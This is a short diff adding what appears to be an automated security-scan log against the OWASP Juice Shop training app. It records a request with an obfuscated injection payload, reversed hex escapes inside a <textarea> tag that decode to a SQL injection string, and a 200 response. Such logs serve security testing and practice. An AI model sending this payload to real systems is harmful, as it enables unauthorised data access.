@@ -1,0 +1,6 @@
+=== SHADOWFOX10 :: SECURITY REPORT ===
+Target: juice-shop.herokuapp.com?q=<textarea>13x\72x\d3x\72x\13x\72x\02x\25x\f4x\02x\72x\<
+
+[STATUS]: 200
+[PAYLOAD]: <textarea>13x\72x\d3x\72x\13x\72x\02x\25x\f4x\02x\72x\</textarea>
+---
